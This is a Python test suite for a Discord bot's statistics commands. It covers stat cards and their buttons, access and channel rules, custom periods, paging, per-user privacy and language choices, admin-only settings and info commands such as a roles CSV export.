"""Statistics commands: who may ask for which card and where, what the reply carries, the buttons under it, and the choices a person makes
for themselves."""
import csv
import io
import re
import time
import types
from unittest import mock

import discord
from discord.ext import commands
from PIL import Image

from captainguild.core.stats import cards, store, views, words
from captainguild.core.stats import timeframe as tf
from captainguild.modules import statistics_commands as sc
from captainguild.modules.statistics import Statistics
from captainguild.modules.utilities import Utilities
from tests.fakes import NOW, BotTest, FakeChannel, FakeMember, FakePermissions


class FakeResponse:
    def __init__(self) -> None:
        self.calls: list = []
        self.done = False

    def is_done(self) -> bool:
        return self.done

    async def defer(self, **kwargs) -> None:
        self.calls.append(("defer", kwargs))
        self.done = True

    async def send_message(self, *args, **kwargs) -> None:
        self.calls.append(("send_message", args, kwargs))
        self.done = True

    async def send_modal(self, modal) -> None:
        self.calls.append(("modal", modal))
        self.done = True

    async def edit_message(self, **kwargs) -> None:
        self.calls.append(("edit_message", kwargs))
        self.done = True


class FakeFollowup:
    def __init__(self) -> None:
        self.sent: list = []

    async def send(self, *args, **kwargs) -> None:
        self.sent.append((args, kwargs))


class FakeInteraction:
    def __init__(self, client, user, guild, channel, *, ephemeral: bool = False, locale: str = "en-US") -> None:
        self.client = client
        self.user = user
        self.guild = guild
        self.channel = channel
        self.locale = locale
        self.response = FakeResponse()
        self.followup = FakeFollowup()
        self.edits: list = []
        self.message = types.SimpleNamespace(flags=types.SimpleNamespace(ephemeral=ephemeral))

    async def edit_original_response(self, **kwargs) -> None:
        self.edits.append(kwargs)


class StatsCase(BotTest):
    modules = [Utilities, Statistics]

    async def asyncSetUp(self):
        await super().asyncSetUp()
        self.stats = self.cog(Statistics)
        everyone = self.guild.default_role
        everyone.permissions = FakePermissions("view_channel", "read_message_history", "send_messages")
        self.guild.icon = None
        await self.bot.settings.save(self.guild.id, "statistics", {"enabled": True})
        self.secret = FakeChannel(self.guild, "staff-room")
        self.secret.permissions_for = lambda member: FakePermissions("administrator") if member.guild_permissions.administrator else FakePermissions()
        self.secret.overwrites = {everyone: discord.PermissionOverwrite(view_channel=False)}
        slot = tf.slot_of(NOW.timestamp())
        rows = []
        for back in range(0, 10 * 96, 5):
            rows.append((self.guild.id, slot - back, self.channel.id, self.member.id, 0, 2))
            rows.append((self.guild.id, slot - back, self.secret.id, self.admin.id, 0, 4))
        await self.bot.message_db.many("INSERT INTO stat_messages (guild_id, slot, channel_id, user_id, flags, count) VALUES (?, ?, ?, ?, ?, ?)", rows)
        self.clock = mock.patch("captainguild.modules.statistics_commands.time.time", return_value=NOW.timestamp())
        self.clock.start()
        self.addCleanup(self.clock.stop)

    async def settings_save(self, **form):
        await self.bot.settings.save(self.guild.id, "statistics", form)

    def card_of(self, ctx) -> tuple[bytes, discord.ui.View]:
        sent = [entry for entry in ctx.sent if entry.get("file") is not None]
        self.assertTrue(sent, f"no card was sent: {ctx.sent} {ctx.fails}")
        file = sent[-1]["file"]
        file.fp.seek(0)
        return file.fp.read(), sent[-1].get("view")


class Cards(StatsCase):
    async def test_a_card_comes_with_its_buttons(self):
        ctx = self.context(author=self.member)
        await self.stats.server_card.callback(self.stats, ctx)
        png, view = self.card_of(ctx)
        with Image.open(io.BytesIO(png)) as image:
            self.assertEqual(image.width, 1280)
        ids = [item.custom_id for item in view.children]
        self.assertTrue(all(re.fullmatch(sc.BUTTON_TEMPLATE, custom) or re.fullmatch(sc.SELECT_TEMPLATE, custom) for custom in ids), ids)
        self.assertTrue(all(len(custom) <= 100 for custom in ids))
        self.assertEqual(sum(1 for item in view.children if isinstance(item, sc.CardSelect)), 1)
        self.assertFalse(ctx.sent[-1].get("ephemeral"))

    async def test_every_command_answers_with_a_card(self):
        for name, args in (("me_card", ()), ("user_card", (self.admin,)), ("user_chart", (self.admin,)), ("channel_card", (self.channel,)),
                           ("channel_chart", (None,)), ("messages_card", ()), ("voice_card", ()), ("activity_card", ()), ("invites_card", ()), ("emoji_card", ()),
                           ("top_card", ()), ("chart_message", ()), ("chart_voice", ()), ("chart_member_count", ()), ("chart_status", ()), ("chart_activity", ()),
                           ("chart_emoji", ()), ("chart_invite", ()), ("chart_user", (None,)), ("chart_channel", (self.channel,))):
            with self.subTest(command=name):
                ctx = self.context(author=self.admin)
                command = getattr(self.stats, name)
                await command.callback(self.stats, ctx, *args)
                self.assertEqual(ctx.fails, [])
                self.card_of(ctx)

    async def test_switched_off_says_so(self):
        await self.settings_save(enabled=False)
        ctx = self.context(author=self.member)
        await self.stats.server_card.callback(self.stats, ctx)
        self.assertEqual(ctx.fails, [words.t("en-US", "off")])

    async def test_cards_stay_a_minute_and_a_settings_save_clears_them(self):
        ctx = self.context(author=self.member)
        with mock.patch.object(views, "gather", wraps=views.gather) as gather:
            await self.stats.server_card.callback(self.stats, ctx)
            await self.stats.server_card.callback(self.stats, self.context(author=self.member))
            self.assertEqual(gather.call_count, 1)
            await self.settings_save(interval="week")
            await self.stats.server_card.callback(self.stats, self.context(author=self.member))
            self.assertEqual(gather.call_count, 2)

    async def test_a_hidden_channel_card_is_refused_or_goes_to_the_asker(self):
        ctx = self.context(author=self.member)
        await self.stats.channel_card.callback(self.stats, ctx, self.secret)
        self.assertEqual(ctx.fails, [words.t("en-US", "cant_see_channel")])
        typed = self.context(author=self.admin)
        await self.stats.channel_card.callback(self.stats, typed, self.secret)
        self.assertEqual(typed.fails, [words.t("en-US", "channel_not_public")])
        slash = self.context(author=self.admin)
        slash.interaction = types.SimpleNamespace(locale="en-US", response=types.SimpleNamespace(is_done=lambda: False))
        await self.stats.channel_card.callback(self.stats, slash, self.secret)
        self.assertTrue(slash.sent[-1]["ephemeral"], "the only answer that can name it goes to the asker alone")
        inside = self.context(author=self.admin, channel=self.secret)
        await self.stats.channel_card.callback(self.stats, inside, self.secret)
        self.assertFalse(inside.sent[-1].get("ephemeral"))

    async def test_a_thread_counts_as_its_channel(self):
        thread = FakeChannel(self.guild, "a thread", discord.ChannelType.public_thread)
        thread.parent = self.channel
        thread.parent_id = self.channel.id
        ctx = self.context(author=self.member)
        with mock.patch.object(views, "gather", wraps=views.gather) as gather:
            await self.stats.channel_card.callback(self.stats, ctx, thread)
        self.assertIs(gather.call_args.args[2], self.channel)

    async def test_someone_who_chose_privacy(self):
        self.stats.private.add(self.member.id)
        ctx = self.context(author=self.admin)
        await self.stats.user_card.callback(self.stats, ctx, self.member)
        self.assertEqual(ctx.fails, [words.t("en-US", "private_person")])
        mine = self.context(author=self.member)
        await self.stats.me_card.callback(self.stats, mine)
        self.assertEqual(mine.fails, [words.t("en-US", "you_private")])

    async def test_a_level_beside_the_card_when_levels_are_on(self):
        levels = types.SimpleNamespace(cfg=lambda guild_id: {"enabled": True}, flush=mock.AsyncMock(), rank_of=mock.AsyncMock(return_value=3),
                                       _entry=mock.AsyncMock(return_value=types.SimpleNamespace(xp=1500)))
        with mock.patch.object(self.bot, "module", side_effect=lambda key: levels if key == "levels" else None):
            png, data = await self.stats.card_png(self.guild, sc.Request("member", self.member.id, "s", "overview", 0, self.member.id, self.guild.id), self.member,
                                                  "en-US", views.Visibility(self.guild, self.member, self.channel, True), ("public", self.channel.id))
        self.assertEqual(data["level"]["rank"], 3)
        self.assertEqual(data["level"]["level"], 5)


class Access(StatsCase):
    async def asks(self, author, name="server_card", *args, channel=None):
        ctx = self.context(author=author, channel=channel)
        await getattr(self.stats, name).callback(self.stats, ctx, *args)
        return ctx.fails

    async def test_restricted_keeps_people_to_themselves(self):
        await self.settings_save(command_access="restricted")
        self.assertEqual(await self.asks(self.member, "user_card", self.admin), [words.t("en-US", "access_restricted")])
        self.assertEqual(await self.asks(self.member, "user_card", self.member), [])
        self.assertEqual(await self.asks(self.member, "server_card"), [])
        self.assertEqual(await self.asks(self.admin, "user_card", self.member), [], "Administrator skips the rule")

    async def test_self_allows_only_cards_about_yourself(self):
        await self.settings_save(command_access="self")
        self.assertEqual(await self.asks(self.member, "server_card"), [words.t("en-US", "access_self")])
        self.assertEqual(await self.asks(self.member, "me_card"), [])
        self.assertEqual(await self.asks(self.member, "chart_user", None), [])

    async def test_admins_only_and_the_roles_that_skip_it(self):
        await self.settings_save(command_access="admins")
        self.assertEqual(await self.asks(self.member, "me_card"), [words.t("en-US", "access_admins")])
        self.assertEqual(await self.asks(self.mod, "me_card"), [words.t("en-US", "access_admins")])
        await self.settings_save(override_roles=[self.role_mod.id])
        self.assertEqual(await self.asks(self.mod, "me_card"), [])
        manager = FakeMember(self.guild, "manager", self.guild.role("Managers", 6, "manage_guild"))
        self.assertEqual(await self.asks(manager, "me_card"), [], "Manage Server skips the rule")

    async def test_command_channels(self):
        other = FakeChannel(self.guild, "bot-commands")
        await self.settings_save(command_channel_mode="allow", command_channels=[other.id])
        self.assertEqual(await self.asks(self.member, "me_card"), [words.t("en-US", "channel_only", channels=f"<#{other.id}>")])
        self.assertEqual(await self.asks(self.member, "me_card", channel=other), [])
        await self.settings_save(command_channel_mode="block", command_channels=[self.channel.id])
        self.assertEqual(await self.asks(self.member, "me_card"), [words.t("en-US", "channel_blocked")])
        category = FakeChannel(self.guild, "Chat", discord.ChannelType.category)
        inside = FakeChannel(self.guild, "chat", category=category)
        await self.settings_save(command_channels=[category.id])
        self.assertEqual(await self.asks(self.member, "me_card", channel=inside), [words.t("en-US", "channel_blocked")], "a category covers its channels")


class Buttons(StatsCase):
    def request(self, view="server", **changes):
        base = sc.Request(view=view, target=0, period="s", kind="overview", page=0, owner=self.member.id, guild=self.guild.id)
        return sc.Request(**{**base.__dict__, **changes})

    def test_custom_ids_carry_the_whole_request(self):
        for request in (self.request(), self.request("member", target=self.admin.id, period="y20250301"), self.request("top", kind="channels_voice", page=12, period="d365")):
            for action in "rtfbnlx":
                found = re.fullmatch(sc.BUTTON_TEMPLATE, request.custom_id(action))
                self.assertEqual(sc.Request.from_match(found), request)
            self.assertIsNotNone(re.fullmatch(sc.SELECT_TEMPLATE, request.custom_id("p")))
            self.assertLessEqual(len(request.custom_id("p")), 100)

    async def test_the_asker_changes_their_card_and_anyone_else_gets_a_copy(self):
        mine = FakeInteraction(self.bot, self.member, self.guild, self.channel)
        await self.stats.card_pressed(mine, self.request(), "r")
        self.assertEqual(mine.response.calls[0], ("defer", {}))
        self.assertEqual(len(mine.edits), 1)
        self.assertIsInstance(mine.edits[0]["attachments"][0], discord.File)
        theirs = FakeInteraction(self.bot, self.admin, self.guild, self.channel)
        await self.stats.card_pressed(theirs, self.request(), "t")
        self.assertEqual(theirs.response.calls[0], ("defer", {"ephemeral": True, "thinking": True}))
        args, kwargs = theirs.followup.sent[0]
        self.assertTrue(kwargs["ephemeral"])
        new_ids = [item.custom_id for item in kwargs["view"].children]
        self.assertTrue(all(f":{self.admin.id}:{self.guild.id}" in custom for custom in new_ids), "the copy belongs to whoever pressed")
        self.assertTrue(any(":cm:" in custom for custom in new_ids), "the server card's chart switch leads to the message chart")

    async def test_the_period_menu_and_the_custom_period(self):
        mine = FakeInteraction(self.bot, self.member, self.guild, self.channel)
        await self.stats.card_pressed(mine, self.request(), "p", "a")
        ids = [item.custom_id for item in mine.edits[0]["view"].children]
        self.assertTrue(all(":a:" in custom for custom in ids))
        form = FakeInteraction(self.bot, self.member, self.guild, self.channel)
        await self.stats.card_pressed(form, self.request(), "p", sc.CUSTOM)
        self.assertEqual(form.response.calls[0][0], "modal")
        submitted = FakeInteraction(self.bot, self.member, self.guild, self.channel)
        await self.stats.custom_period_submitted(submitted, self.request(), "90", "en-US")
        self.assertTrue(all(":d90:" in item.custom_id for item in submitted.edits[0]["view"].children))
        wrong = FakeInteraction(self.bot, self.member, self.guild, self.channel, locale="de")
        await self.stats.custom_period_submitted(wrong, self.request(), "yesterday-ish", "de")
        self.assertIn(words.t("de", "custom_bad"), wrong.response.calls[0][2]["content"] if "content" in wrong.response.calls[0][2] else wrong.response.calls[0][1][0])

    async def test_top_pages(self):
        for number in range(25):
            await self.bot.message_db.run("INSERT INTO stat_messages (guild_id, slot, channel_id, user_id, flags, count) VALUES (?, ?, ?, ?, 0, ?)",
                                          (self.guild.id, tf.slot_of(NOW.timestamp()), self.channel.id, 900 + number, number + 1))
        mine = FakeInteraction(self.bot, self.member, self.guild, self.channel)
        await self.stats.card_pressed(mine, self.request("top"), "s", "members_messages")
        labels = [item.item.label for item in mine.edits[0]["view"].children if isinstance(item, sc.CardButton)]
        self.assertIn("1 / 3", labels)
        last = FakeInteraction(self.bot, self.member, self.guild, self.channel)
        await self.stats.card_pressed(last, self.request("top", kind="members_messages"), "l")
        labels = [item.item.label for item in last.edits[0]["view"].children if isinstance(item, sc.CardButton)]
        self.assertIn("3 / 3", labels)
        ids = [item.custom_id for item in last.edits[0]["view"].children]
        self.assertTrue(any(".2:" in custom for custom in ids), "the buttons carry the page actually shown")

    async def test_a_press_after_the_channel_is_gone_or_statistics_turned_off(self):
        gone = FakeInteraction(self.bot, self.member, self.guild, self.channel)
        await self.stats.card_pressed(gone, self.request("channel", target=123456789012345678), "r")
        self.assertEqual(gone.response.calls[0][2]["ephemeral"], True)
        await self.settings_save(enabled=False)
        off = FakeInteraction(self.bot, self.member, self.guild, self.channel)
        await self.stats.card_pressed(off, self.request(), "r")
        self.assertIn(words.t("en-US", "off"), off.response.calls[0][1][0])

    async def test_a_card_sent_by_dm_answers_its_buttons_there(self):
        mine = FakeInteraction(self.bot, self.member, None, None)
        with mock.patch.object(self.stats, "card_png", wraps=self.stats.card_png) as drawn:
            await self.stats.card_pressed(mine, self.request(), "r")
        self.assertEqual(drawn.call_args.args[5], ("private", self.member.id))
        self.assertEqual(len(mine.edits), 1, "the DM's card changes in place")

    async def test_a_private_card_stays_private_for_its_owner(self):
        mine = FakeInteraction(self.bot, self.member, self.guild, self.channel, ephemeral=True)
        with mock.patch.object(self.stats, "card_png", wraps=self.stats.card_png) as drawn:
            await self.stats.card_pressed(mine, self.request(), "r")
        self.assertEqual(drawn.call_args.args[5], ("private", self.member.id))


class Personal(StatsCase):
    async def test_the_subcommands_join_the_shared_stats_group(self):
        group = self.bot.get_command("stats")
        for name in ("message", "voice", "user", "channel", "activity", "invite", "emoji", "privacy", "language", "private_replies"):
            self.assertIsNotNone(group.get_command(name), name)
        self.assertIs(group.get_command("message").cog, self.stats)
        self.assertIsInstance(group.get_command("privacy").cog, sc.Anywhere)
        self.assertLessEqual(len(group.app_command.commands), 25)

    async def test_personal_commands_work_where_statistics_are_off(self):
        await self.settings_save(enabled=False)
        ctx = self.context(author=self.member)
        ctx.command = self.bot.get_command("stats language")
        self.assertTrue(await self.bot._check_command(ctx))
        ctx.command = self.bot.get_command("stats message")
        with self.assertRaises(commands.CheckFailure):
            await self.bot._check_command(ctx)

    async def test_language(self):
        anywhere = self.stats._cards_state()["anywhere"]
        ctx = self.context(author=self.member)
        await anywhere._language(ctx, "fr")
        self.assertEqual(ctx.oks, [words.t("fr", "language_set", name="Français")])
        self.assertEqual(self.stats.language_of(self.member.id, "de"), "fr")
        row = await self.bot.db.one("SELECT language FROM stat_user_settings WHERE user_id = ?", (self.member.id,))
        self.assertEqual(row["language"], "fr")
        await anywhere._language(ctx, "auto")
        self.assertEqual(self.stats.language_of(self.member.id, "de"), "de")
        card = self.context(author=self.member)
        await anywhere._language(self.context(author=self.member), "de")
        with mock.patch.object(views, "gather", wraps=views.gather) as gather:
            await self.stats.me_card.callback(self.stats, card)
        self.assertEqual(gather.call_args.args[0].lang, "de")

    async def test_the_my_data_page_keeps_the_commands_in_step(self):
        self.assertEqual(await self.stats.set_language(self.member.id, "nl"), "nl")
        self.assertEqual(self.stats.language_of(self.member.id, "de"), "nl")
        await self.bot.db.run("UPDATE stat_user_settings SET ephemeral = 1 WHERE user_id = ?", (self.member.id,))
        self.assertFalse(self.stats.replies_private(self.member.id))
        await self.stats.reload_choices(self.member.id)
        self.assertTrue(self.stats.replies_private(self.member.id))
        await self.stats.set_private_replies(self.member.id, False)
        self.assertFalse(self.stats.replies_private(self.member.id))

    async def test_private_replies(self):
        anywhere = self.stats._cards_state()["anywhere"]
        await anywhere._private_replies(self.context(author=self.member), "on")
        typed = self.context(author=self.member)
        await self.stats.server_card.callback(self.stats, typed)
        self.assertEqual(typed.sent, [])
        self.assertIsNotNone(self.member.dms[-1].get("file"), "a typed command answers by DM")
        slash = self.context(author=self.member)
        slash.interaction = types.SimpleNamespace(locale="en-US", response=types.SimpleNamespace(is_done=lambda: True))
        await self.stats.server_card.callback(self.stats, slash)
        self.assertTrue(slash.sent[-1]["ephemeral"])
        await anywhere._private_replies(self.context(author=self.member), "off")
        self.assertFalse(self.stats.replies_private(self.member.id))

    async def test_privacy_takes_the_name_off_and_waits_a_day(self):
        await self.bot.message_db.run("INSERT INTO stat_people (guild_id, user_id, name, bot, seen_at) VALUES (?, ?, 'member', 0, 0)", (self.guild.id, self.member.id))
        before = await self.bot.message_db.scalar("SELECT SUM(count) FROM stat_messages WHERE user_id = ?", (self.member.id,))
        key, _ = await self.stats.set_privacy(self.member.id, True, now=NOW.timestamp())
        self.assertEqual(key, "privacy_done_on")
        self.assertIn(self.member.id, self.stats.private)
        self.assertEqual(await self.bot.message_db.scalar("SELECT COUNT(*) FROM stat_messages WHERE user_id = ?", (self.member.id,)), 0)
        self.assertEqual(await self.bot.message_db.scalar("SELECT SUM(count) FROM stat_messages WHERE user_id = 0"), before)
        self.assertEqual(await self.bot.message_db.scalar("SELECT COUNT(*) FROM stat_people WHERE user_id = ?", (self.member.id,)), 0)
        key, values = await self.stats.set_privacy(self.member.id, False, now=NOW.timestamp() + 3600)
        self.assertEqual(key, "privacy_wait")
        self.assertEqual(values["next"], int(NOW.timestamp()) + 86400)
        key, _ = await self.stats.set_privacy(self.member.id, False, now=NOW.timestamp() + 86401)
        self.assertEqual(key, "privacy_done_off")
        self.assertNotIn(self.member.id, self.stats.private)

    async def test_asking_again_after_a_failed_move_finishes_it(self):
        from unittest import mock
        with mock.patch.object(sc.store, "anonymize", mock.AsyncMock(side_effect=RuntimeError("disk"))):
            key, _ = await self.stats.set_privacy(self.member.id, True, now=NOW.timestamp())
        self.assertEqual(key, "privacy_failed")
        self.assertIn(self.member.id, self.stats.private, "new counts go to no one even while the move waits")
        with mock.patch.object(sc.store, "anonymize", mock.AsyncMock()) as moved:
            key, _ = await self.stats.set_privacy(self.member.id, True, now=NOW.timestamp() + 60)
        self.assertEqual(key, "privacy_done_on")
        moved.assert_awaited_once()
        with mock.patch.object(sc.store, "anonymize", mock.AsyncMock()) as moved:
            key, _ = await self.stats.set_privacy(self.member.id, True, now=NOW.timestamp() + 120)
        self.assertEqual(key, "privacy_done_on")
        moved.assert_not_awaited()

    async def test_privacy_buttons(self):
        ctx = self.context(author=self.member)
        ctx.interaction = types.SimpleNamespace(locale="en-US", response=types.SimpleNamespace(is_done=lambda: False))
        await self.stats.privacy_command(ctx)
        view = ctx.sent[-1]["view"]
        self.assertEqual([item.custom_id for item in view.children], [f"cgpv:on:{self.member.id}", f"cgpv:no:{self.member.id}"])
        stranger = FakeInteraction(self.bot, self.admin, self.guild, self.channel)
        await self.stats.privacy_pressed(stranger, "on", self.member.id)
        self.assertNotIn(self.member.id, self.stats.private, "only the person can turn their own privacy on")
        pressed = FakeInteraction(self.bot, self.member, self.guild, self.channel)
        await self.stats.privacy_pressed(pressed, "on", self.member.id)
        self.assertIn(self.member.id, self.stats.private)
        self.assertEqual(pressed.edits[-1]["content"], words.t("en-US", "privacy_done_on"))

    async def test_a_restart_finishes_taking_a_name_off(self):
        await self.bot.db.run("INSERT INTO stat_user_settings (user_id, private, private_changed_at) VALUES (?, 1, ?)", (self.member.id, NOW.timestamp()))
        self.stats._cards_memory = None
        await self.stats._commands_load()
        for task in list(self.stats._cards_state()["tasks"]):
            await task
        self.assertEqual(await self.bot.message_db.scalar("SELECT COUNT(*) FROM stat_messages WHERE user_id = ?", (self.member.id,)), 0)
        row = await self.bot.db.one("SELECT anonymized_at FROM stat_user_settings WHERE user_id = ?", (self.member.id,))
        self.assertIsNotNone(row["anonymized_at"])


class Settings(StatsCase):
    async def test_only_managers_change_how_statistics_read(self):
        for name in ("stats_filter", "stats_filter channels", "stats_filter channels add", "stats_filter members mode", "stats_filter roles allow",
                     "stats_filter roles block", "stats_filter emoji add", "stats_settings", "stats_settings time", "stats_settings view", "stats_settings access",
                     "stats_settings invites", "stats_settings tracking", "stats_check"):
            with self.subTest(command=name):
                command = self.bot.get_command(name)
                self.assertFalse(self.bot.command_decision(command, self.member, self.channel).allowed, name)
                self.assertTrue(self.bot.command_decision(command, self.admin, self.channel).allowed, name)
        self.assertTrue(self.bot.command_decision(self.bot.get_command("server"), self.member, self.channel).allowed)

    async def test_filters(self):
        ctx = self.context(author=self.admin)
        await self.stats.filter_channels_add.callback(self.stats, ctx, self.secret)
        await self.stats.filter_channels_mode.callback(self.stats, ctx, "allow")
        await self.stats.filter_members_add.callback(self.stats, ctx, self.mod)
        await self.stats.filter_roles_allow.callback(self.stats, ctx, "add", self.role_member)
        await self.stats.filter_roles_block.callback(self.stats, ctx, "add", self.role_muted)
        await self.stats.filter_emoji_add.callback(self.stats, ctx, "\U0001F44D\U0001F3FD")
        cfg = self.stats.cfg(self.guild.id)
        self.assertEqual((cfg["channels"], cfg["channel_mode"], cfg["members"], cfg["roles_allow"], cfg["roles_block"], cfg["emoji"]),
                         ([self.secret.id], "allow", [self.mod.id], [self.role_member.id], [self.role_muted.id], ["u:\U0001F44D"]))
        await self.stats.filter_channels_add.callback(self.stats, ctx, self.secret)
        self.assertIn("already", self.admin.dms[-1]["content"])
        await self.stats.filter_channels_remove.callback(self.stats, ctx, self.secret)
        self.assertEqual(self.stats.cfg(self.guild.id)["channels"], [])
        await self.stats.filter_emoji_add.callback(self.stats, ctx, "<:theirs:123456789012345678>")
        self.assertEqual(ctx.fails[-1], words.t("en-US", "bad_emoji"), "another server's emoji can't be counted here")

    async def test_time_settings(self):
        ctx = self.context(author=self.admin)
        await self.stats.settings_time.callback(self.stats, ctx, "america/los_angeles", "90", "week", "minutes")
        cfg = self.stats.cfg(self.guild.id)
        self.assertEqual((cfg["timezone"], cfg["lookback"]["days"], cfg["interval"], cfg["time_unit"]), ("America/Los_Angeles", 90, "week", "minutes"))
        await self.stats.settings_time.callback(self.stats, ctx, None, "2025-03-01", None, None)
        self.assertEqual(self.stats.cfg(self.guild.id)["lookback"]["since"], "2025-03-01")
        await self.stats.settings_time.callback(self.stats, ctx, "Mars/Olympus", None, None, None)
        self.assertEqual(ctx.fails[-1], words.t("en-US", "bad_zone"))
        await self.stats.settings_time.callback(self.stats, ctx, None, "soon", None, None)
        self.assertEqual(ctx.fails[-1], words.t("en-US", "custom_bad"))
        self.assertEqual(sc.zone_matches("los ang")[0], "America/Los_Angeles")
        self.assertEqual(sc.zone_matches(""), list(sc.COMMON_ZONES))

    async def test_view_and_access_settings(self):
        ctx = self.context(author=self.admin)
        await self.stats.settings_view.callback(self.stats, ctx, "both", "talking, afk")
        cfg = self.stats.cfg(self.guild.id)
        self.assertEqual((cfg["include"], cfg["voice_states"]), ("both", ["afk", "talking"]))
        await self.stats.settings_view.callback(self.stats, ctx, None, "whispering")
        self.assertIn("talking", ctx.fails[-1])
        manager = FakeMember(self.guild, "manager", self.guild.role("Managers", 6, "manage_guild"))
        their = self.context(author=manager)
        await self.stats.settings_access.callback(self.stats, their, "restricted", "allow", self.channel, None, None, None)
        self.assertEqual(self.stats.cfg(self.guild.id)["command_access"], "restricted")
        self.assertEqual(self.stats.cfg(self.guild.id)["command_channels"], [self.channel.id])
        await self.stats.settings_access.callback(self.stats, their, None, None, None, None, self.role_mod, None)
        self.assertEqual(their.fails[-1], words.t("en-US", "only_admins_change"), "the roles that skip the rules are an admin's choice")
        await self.stats.settings_access.callback(self.stats, ctx, None, None, None, self.channel, self.role_mod, None)
        cfg = self.stats.cfg(self.guild.id)
        self.assertEqual((cfg["override_roles"], cfg["command_channels"]), ([self.role_mod.id], []))

    async def test_invite_and_tracking_settings(self):
        ctx = self.context(author=self.admin)
        await self.stats.settings_invites.callback(self.stats, ctx, 60, 1440, self.role_member, None, "all")
        cfg = self.stats.cfg(self.guild.id)
        self.assertEqual((cfg["invite_min_account_minutes"], cfg["invite_min_join_minutes"], cfg["invite_required_roles"], cfg["invite_required_match"]),
                         (60, 1440, [self.role_member.id], "all"))
        await self.stats.settings_invites.callback(self.stats, ctx, None, None, None, self.role_member, None)
        self.assertEqual(self.stats.cfg(self.guild.id)["invite_required_roles"], [])
        await self.stats.settings_tracking.callback(self.stats, ctx, "on", "off", self.secret, None)
        cfg = self.stats.cfg(self.guild.id)
        self.assertEqual((cfg["track_activities"], cfg["verify_activities"], cfg["untracked_channels"]), (True, False, [self.secret.id]))
        await self.stats.settings_tracking.callback(self.stats, ctx, None, None, None, self.secret)
        self.assertEqual(self.stats.cfg(self.guild.id)["untracked_channels"], [])
        embed = self.admin.dms[-1]["embed"]
        self.assertIn(words.t("en-US", "settings_invites"), [field.name for field in embed.fields])

    async def test_show_lists_everything(self):
        await self.settings_save(channels=[self.secret.id], channel_mode="allow", emoji=["u:\U0001F600"], override_roles=[self.role_mod.id])
        ctx = self.context(author=self.admin)
        await self.stats.settings_group.callback(self.stats, ctx)
        self.assertEqual(ctx.sent, [], "a typed answer that names the settings goes by DM")
        embed = self.admin.dms[-1]["embed"]
        text = "\n".join(field.value for field in embed.fields)
        self.assertIn(f"<#{self.secret.id}>", text)
        self.assertIn("\U0001F600", text)
        self.assertIn(f"<@&{self.role_mod.id}>", text)

    async def test_the_check(self):
        self.guild.me.roles = [self.guild.default_role]
        report = self.stats.check_lines(self.guild, self.channel, "en-US")
        self.assertIn(words.t("en-US", "check_presence"), report["problems"])
        self.assertIn(words.t("en-US", "check_invites"), report["problems"])
        self.assertTrue(any("Attach Files" in line and "Send Messages" not in line for line in report["problems"]))
        self.assertEqual(report["unseen"], [self.secret], "the bot can't see the staff room")


class Info(StatsCase):
    async def test_roles_file(self):
        ctx = self.context(author=self.member)
        await self.stats.info_roles.callback(self.stats, ctx, self.role_admin, self.role_mod)
        file = ctx.sent[-1]["file"]
        file.fp.seek(0)
        text = file.fp.read().decode()
        lines = text.strip().splitlines()
        self.assertEqual(lines[0].split(","), ["id", "username", "display_name", "nickname", "joined_at", "account_created", "bot", "roles"])
        self.assertEqual({int(line.split(",")[0]) for line in lines[1:]}, {self.owner.id, self.admin.id, self.mod.id})
        self.assertIn("3", ctx.sent[-1]["content"])

    async def test_ids(self):
        ctx = self.context(author=self.member)
        await self.stats.info_id.callback(self.stats, ctx, mentions=f"<@{self.admin.id}> <#{self.channel.id}> <@&{self.role_mod.id}> {self.mod.id}")
        content = ctx.sent[-1][("content")]
        for number in (self.guild.id, self.admin.id, self.channel.id, self.role_mod.id, self.mod.id):
            self.assertIn(f"`{number}`", content)

    async def test_emoji_by_use(self):
        party = types.SimpleNamespace(id=111111111111111111, name="party", animated=False, available=True)
        party.__str__ = lambda self: "<:party:111111111111111111>"
        quiet = types.SimpleNamespace(id=222222222222222222, name="quiet", animated=False, available=True)
        self.guild.emojis = [quiet, party]
        await self.bot.message_db.run("INSERT INTO stat_emoji (guild_id, slot, channel_id, user_id, target_id, emoji, use, flags, count) VALUES (?, ?, ?, ?, 0, ?, ?, 0, 7)",
                                      (self.guild.id, tf.slot_of(NOW.timestamp()), self.channel.id, self.member.id, store.custom_key(party.id), store.IN_TEXT))
        ctx = self.context(author=self.member)
        await self.stats.info_emoji.callback(self.stats, ctx)
        description = ctx.sent[-1]["embed"].description.splitlines()
        self.assertIn("party", description[0])
        self.assertIn("7", description[0])
        self.assertIn(words.t("en-US", "unused"), description[1])

    async def test_activity_needs_presences(self):
        ctx = self.context(author=self.member)
        await self.stats.info_activity.callback(self.stats, ctx, self.admin)
        self.assertEqual(ctx.fails, [words.t("en-US", "info_no_presence")])
        self.bot._connection._intents.presences = True
        try:
            self.admin.activities = [discord.Game("Blender"), discord.CustomActivity(name="printing")]
            await self.stats.info_activity.callback(self.stats, ctx, self.admin)
        finally:
            self.bot._connection._intents.presences = False
        text = ctx.sent[-1]["embed"].description
        self.assertIn("Blender", text)
        self.assertIn(words.t("en-US", "info_not_counted_off"), text)
        self.assertIn(words.t("en-US", "info_not_counted_kind"), text)

    async def test_emoji_keys(self):
        self.guild.get_emoji = lambda emoji_id: object() if emoji_id == 111111111111111111 else None
        self.assertEqual(sc.emoji_key_of(self.guild, "<a:spin:111111111111111111>"), "c:111111111111111111")
        self.assertEqual(sc.emoji_key_of(self.guild, "111111111111111111"), "c:111111111111111111")
        self.assertIsNone(sc.emoji_key_of(self.guild, "333333333333333333"))
        self.assertEqual(sc.emoji_key_of(self.guild, "\u2764"), "u:\u2764")
        self.assertIsNone(sc.emoji_key_of(self.guild, "hello"))


class Menus(StatsCase):
    async def test_the_pack_holds_the_menus_and_commands(self):
        held = self.bot.pack_commands["statistics"]
        menus = sorted((command.name, command.type.value) for command in held if isinstance(command, discord.app_commands.ContextMenu))
        self.assertEqual(menus, [("Channel Statistics", 3), ("Member Statistics", 2), ("Member Statistics", 3)])
        names = {command.name for command in held if not isinstance(command, discord.app_commands.ContextMenu)}
        self.assertTrue({"server", "me", "user", "channel", "messages", "voice", "activity", "invites", "emoji", "chart", "top", "info", "stats_filter",
                         "stats_settings", "stats_check"} <= names)
        self.assertIsNone(self.bot.tree.get_command("server"), "pack commands stay out of the shared list")

    async def test_the_menus_answer(self):
        message = types.SimpleNamespace(channel=self.channel, author=self.admin)
        for callback, target in ((self.stats.channel_statistics_menu, message), (self.stats.member_statistics_message_menu, message),
                                 (self.stats.member_statistics_user_menu, self.admin)):
            with self.subTest(menu=callback.__name__):
                interaction = FakeInteraction(self.bot, self.member, self.guild, self.channel)
                await callback(interaction, target)
